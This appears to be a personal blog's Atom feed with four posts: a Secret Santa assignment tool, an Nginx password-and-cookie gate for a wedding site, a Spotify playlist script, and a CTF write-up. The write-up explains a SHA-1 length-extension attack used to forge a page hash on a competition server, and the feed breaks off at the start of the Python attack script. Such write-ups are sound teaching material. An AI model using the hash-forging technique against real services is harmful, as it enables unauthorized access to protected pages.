<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title>Guy Lewin&#x27;s Blog</title>
    <link href="https://guylewin.com/atom.xml" rel="self"/>
    <link href="https:&#x2F;&#x2F;guylewin.com"/>
    <updated>2025-11-01T01:27:52+0000</updated>
    <id>https:&#x2F;&#x2F;guylewin.com</id>

    
    
    
    
        
        <entry>
            <title>Automating Secret Santa</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-10-18-automating-secret-santa&#x2F;"/>
            <updated>2025-10-18T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-10-18-automating-secret-santa&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;Every December, our family organizes a Secret Santa gift exchange. But this year presented a new problem - our usual organizer wanted to participate instead of managing the assignments.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Suddenly, we needed a fair way to assign Secret Santas that could handle exclusions (no one should get their spouse or immediate family), avoid repeat pairings from previous years, and work without someone manually coordinating everything.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-over-engineered-solution&amp;quot;&amp;gt;The Over-Engineered Solution&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Instead of finding a simple solution, I (but mostly Cursor) decided to treat this as an optimization problem. Enter the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;en.wikipedia.org&amp;#x2F;wiki&amp;#x2F;Hungarian_algorithm&amp;quot;&amp;gt;Hungarian algorithm&amp;lt;&amp;#x2F;a&amp;gt; - a mathematical method for solving assignment problems that finds the globally optimal solution.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The system works by:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Handling constraints&amp;lt;&amp;#x2F;strong&amp;gt; like exclusions&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Building a cost matrix&amp;lt;&amp;#x2F;strong&amp;gt; where each potential giver-receiver pair gets a &amp;quot;penalty score&amp;quot; based on historical assignments (with recent assignment more penalized) supporting individuals within groups&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Applying the Hungarian algorithm&amp;lt;&amp;#x2F;strong&amp;gt; to find the assignment that minimizes total cost&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;strong&amp;gt;Outputting ideal solution&amp;lt;&amp;#x2F;strong&amp;gt; to either console (default) or by email so even the script runner doesn&amp;#x27;t see the assignments&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;p&amp;gt;You can find the complete code on GitHub: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;secret-santa&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;secret-santa&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Securing Wedding Website with Nginx</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-11-securing-wedding-website-with-nginx&#x2F;"/>
            <updated>2025-01-11T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-11-securing-wedding-website-with-nginx&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;While planning my wedding, I found myself diving into an interesting technical challenge: how to share our Save the Date website with guests while keeping it private from the general public. This post details how I implemented a simple yet effective authentication system using Nginx, URL parameters, and cookies - without needing to modify the actual website content.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-challenge&amp;quot;&amp;gt;The Challenge&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;My partner created a beautiful HTML-based Save the Date website that we wanted to share exclusively with our wedding guests. While the content wasn&amp;#x27;t particularly sensitive, I preferred to keep it private and away from search engines. The catch? I wanted to maintain the website as pure HTML without adding any authentication code to the frontend.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-solution&amp;quot;&amp;gt;The Solution&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I developed a solution using Nginx that combines three key elements:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;A password embedded in the URL as a query parameter&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Browser cookie persistence for a smoother user experience&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Server-side validation using Nginx configuration&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;p&amp;gt;When guests receive our Save the Date link (e.g., &amp;lt;code&amp;gt;https:&amp;#x2F;&amp;#x2F;ourwedding.com&amp;#x2F;save-the-date?pwd=secretkey&amp;lt;&amp;#x2F;code&amp;gt;), Nginx validates the password, sets a persistent cookie, and redirects them to the clean URL. Future visits are authenticated via the cookie, eliminating the need for the query parameter.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;implementation-details&amp;quot;&amp;gt;Implementation Details&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;For this example, let&amp;#x27;s use &amp;lt;code&amp;gt;aabbccddeeffgg&amp;lt;&amp;#x2F;code&amp;gt; as our URL-friendly password. Here&amp;#x27;s the Nginx configuration that makes it all work:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;location = &amp;#x2F;robots.txt {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    add_header Content-Type text&amp;#x2F;plain;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    return 200 &amp;amp;quot;User-agent: *\nDisallow: &amp;#x2F;\n&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;location ^~ &amp;#x2F;save-the-date {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Disable client-side caching 
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    expires -1;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Set password here
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    set $password &amp;amp;quot;aabbccddeeffgg&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Start with empty auth state variable
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    set $auth_state &amp;amp;quot;&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Auth state will be set to &amp;amp;quot;q&amp;amp;quot; if query string is correct, empty string otherwise
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($arg_pwd = $password) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        set $auth_state &amp;amp;quot;q&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # Auth state will be set to &amp;amp;quot;qc&amp;amp;quot; if cookie and query string correctly configured, &amp;amp;quot;c&amp;amp;quot; if only cookie, &amp;amp;quot;q&amp;amp;quot; if only query string and empty string if no correct authentication
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($cookie_pwd = $password) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        set $auth_state &amp;amp;quot;${auth_state}c&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # If there has been no correct authentication provided - return 403 Forbidden
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($auth_state = &amp;amp;quot;&amp;amp;quot;) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        return 403;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    # If the query string was valid (with or without a cookie), set cookie and redirect to the URL without query string
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    if ($auth_state ~ &amp;amp;quot;qc?&amp;amp;quot;) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        add_header Set-Cookie &amp;amp;quot;pwd=${password};Domain=${host};Path=&amp;#x2F;save-the-date&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        return 301 &amp;#x2F;save-the-date;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    root &amp;#x2F;var&amp;#x2F;www&amp;#x2F;ourwedding.com&amp;#x2F;public;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    try_files $uri &amp;#x2F;save-the-date&amp;#x2F;index.html;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Let&amp;#x27;s break down how this configuration works:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Crawler Protection&amp;lt;&amp;#x2F;strong&amp;gt;: A standalone &amp;lt;code&amp;gt;&amp;#x2F;robots.txt&amp;lt;&amp;#x2F;code&amp;gt; directive ensures search engines won&amp;#x27;t index the site, regardless of authentication status.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Authentication Logic&amp;lt;&amp;#x2F;strong&amp;gt;: The main directive uses Nginx variables to track authentication state:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;code&amp;gt;$auth_state&amp;lt;&amp;#x2F;code&amp;gt; can be empty, &amp;quot;q&amp;quot; (valid query string), &amp;quot;c&amp;quot; (valid cookie), or &amp;quot;qc&amp;quot; (both valid)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;If no valid authentication exists (&amp;lt;code&amp;gt;$auth_state = &amp;quot;&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt;), returns 403 Forbidden&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;When a valid query string is present, sets the cookie and redirects to remove the parameter&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;File Serving&amp;lt;&amp;#x2F;strong&amp;gt;: Once authenticated, Nginx serves files from the specified directory, defaulting to &amp;lt;code&amp;gt;index.html&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;h2 id=&amp;quot;future-plans&amp;quot;&amp;gt;Future Plans&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;This configuration is part of a larger wedding RSVP system I&amp;#x27;m developing. Once I&amp;#x27;ve polished the complete solution, I&amp;#x27;ll be open-sourcing it for other couples who want to add a technical touch to their wedding planning.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Want to implement this for your own event? Just update the password, paths, and domain names in the configuration to match your needs. Just remember to choose a URL-friendly password - I recommend using a hex-encoded &amp;#x2F; Base64 string for compatibility.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Spotify Smart Playlists</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-01-spotify-smart-playlists&#x2F;"/>
            <updated>2025-01-01T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-01-spotify-smart-playlists&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;Happy New Year! I&amp;#x27;m excited to share some projects I&amp;#x27;ve been working on over the past few years, starting with Spotify Smart Playlists - Recently Liked Songs:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-problem&amp;quot;&amp;gt;The Problem&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;As a music lover and long-time Spotify user (since 2015!), I&amp;#x27;ve collected over 3,500 liked songs. However, my 128GB iPhone couldn&amp;#x27;t download them all for offline listening. I had to manually create smaller playlists for situations like flights or camping trips without service.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-inspiration&amp;quot;&amp;gt;The Inspiration&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I remembered the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;support.apple.com&amp;#x2F;en-mo&amp;#x2F;guide&amp;#x2F;itunes&amp;#x2F;itns3001&amp;#x2F;windows&amp;quot;&amp;gt;Smart Playlists feature from iTunes&amp;lt;&amp;#x2F;a&amp;gt;, which allowed for dynamic playlist creation based on user-defined criteria. Searching for a similar solution in Spotify, I stumbled upon &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;smarterplaylists.playlistmachinery.com&amp;#x2F;&amp;quot;&amp;gt;Smarter Playlists&amp;lt;&amp;#x2F;a&amp;gt;. Unfortunately, I couldn&amp;#x27;t get periodic runs to work and was very hesitant to share my Spotify tokens over HTTP (a security concern, especially in 2025).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-solution&amp;quot;&amp;gt;The Solution&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I decided to create my own Python-based solution, leveraging an always-on Linux laptop at home. You can find the code and setup instructions on GitHub: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;spotify-recent-songs&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;spotify-recent-songs&amp;lt;&amp;#x2F;a&amp;gt;. This code automatically maintains a playlist with my 1,500 most recently liked songs.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-outcome&amp;quot;&amp;gt;The Outcome&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;With this playlist, I could keep my recently liked songs downloaded without consuming too much space. Although I&amp;#x27;ve since upgraded to a new phone with more storage - I hope it helps others facing similar challenges.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>THCon 2k22 CTF - &quot;Local Card Maker&quot; Writeup</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-04-17-thcon-2k22-ctf-local-card-maker-writeup&#x2F;"/>
            <updated>2022-04-17T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-04-17-thcon-2k22-ctf-local-card-maker-writeup&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;I participated in &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;ctf.thcon.party&amp;#x2F;&amp;quot;&amp;gt;THCon 2k22 CTF&amp;lt;&amp;#x2F;a&amp;gt; and amongst the incredible &amp;quot;web&amp;quot; challenges - my favorite was &amp;quot;Local Card Maker&amp;quot; (made by &amp;lt;code&amp;gt;jrjgjk&amp;lt;&amp;#x2F;code&amp;gt;). In this post I&amp;#x27;ll describe the challenge and my step-by-step solution.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-challenge&amp;quot;&amp;gt;The Challenge&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;1.png&amp;quot; alt=&amp;quot;Description in the CTF portal&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Right off the bat we can tell there’s going to be some SHA-1 (&amp;lt;em&amp;gt;&amp;quot;secure hash algorithm 1&amp;quot;&amp;lt;&amp;#x2F;em&amp;gt;) with a 23 character &amp;quot;secret key&amp;quot;. The attached ZIP file contained only the following &amp;lt;code&amp;gt;scan.txt&amp;lt;&amp;#x2F;code&amp;gt; file:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;PAGE	|	HTTP_STATUS
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;index.php   ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;phpinfo.php ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;change_profile.php ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;&amp;#x2F;view_profile.php ==&amp;amp;gt; 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The goal is to read the content of &amp;lt;code&amp;gt;&amp;#x2F;flag.txt&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;exploring-the-site&amp;quot;&amp;gt;Exploring the Site&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The site has 2 interesting pages I could find:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;2.png&amp;quot; alt=&amp;quot;View&amp;quot; &amp;#x2F;&amp;gt;
&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;3.png&amp;quot; alt=&amp;quot;Edit&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The edit page sets a cookie (&amp;lt;code&amp;gt;user_data&amp;lt;&amp;#x2F;code&amp;gt;) with the PHP-serialized &amp;lt;code&amp;gt;User&amp;lt;&amp;#x2F;code&amp;gt; object set in the form (along with another cookie - &amp;lt;code&amp;gt;user_hash&amp;lt;&amp;#x2F;code&amp;gt; to sign that data), and the view page displays that information if the hash is valid. I tried modifying &amp;lt;code&amp;gt;user_data&amp;lt;&amp;#x2F;code&amp;gt; in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The URLs of these pages - &amp;lt;code&amp;gt;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=Y2hhbmdlX3Byb2ZpbGU=&amp;amp;amp;pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=dmlld19wcm9maWxl&amp;amp;amp;pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd&amp;lt;&amp;#x2F;code&amp;gt; - both seem to go through &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt; for rendering. The &amp;lt;code&amp;gt;page&amp;lt;&amp;#x2F;code&amp;gt; parameter is base64-encoded &amp;quot;change_profile&amp;quot; and &amp;quot;view_profile&amp;quot; which matches the files in &amp;lt;code&amp;gt;scan.txt&amp;lt;&amp;#x2F;code&amp;gt;!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When I tried to access &amp;lt;code&amp;gt;&amp;#x2F;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;&amp;#x2F;change_profile.php&amp;lt;&amp;#x2F;code&amp;gt; or &amp;lt;code&amp;gt;&amp;#x2F;view_profile.php&amp;lt;&amp;#x2F;code&amp;gt; directly I received an error (&amp;quot;Direct access to this page is disable.&amp;quot;).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Theoretically - we can access &amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt; if we could put that value (Base64-encoded) in the &amp;lt;code&amp;gt;page&amp;lt;&amp;#x2F;code&amp;gt; query parameter - but without finding the proper hash the validation will keep failing.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;sha-1-exploitation&amp;quot;&amp;gt;SHA-1 Exploitation&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;A quick Google search led me to &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;journal.batard.info&amp;#x2F;post&amp;#x2F;2011&amp;#x2F;03&amp;#x2F;04&amp;#x2F;exploiting-sha-1-signed-messages&amp;quot;&amp;gt;this article&amp;lt;&amp;#x2F;a&amp;gt; which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I relied heavily on &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;nicolasff&amp;#x2F;pysha1&amp;quot;&amp;gt;the code from the article &amp;lt;code&amp;gt;nicolasff&amp;lt;&amp;#x2F;code&amp;gt; posted on GitHub&amp;lt;&amp;#x2F;a&amp;gt; to create a script to fetch &amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt;:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;struct
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;urllib.parse
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# The code below is based on https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;nicolasff&amp;#x2F;pysha1 (adapted to Python3) until line 87:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xffffffff
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;rotl&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;n&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    lmask &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;amp;lt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;32&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    rmask &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    l &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;lmask
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    r &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;rmask
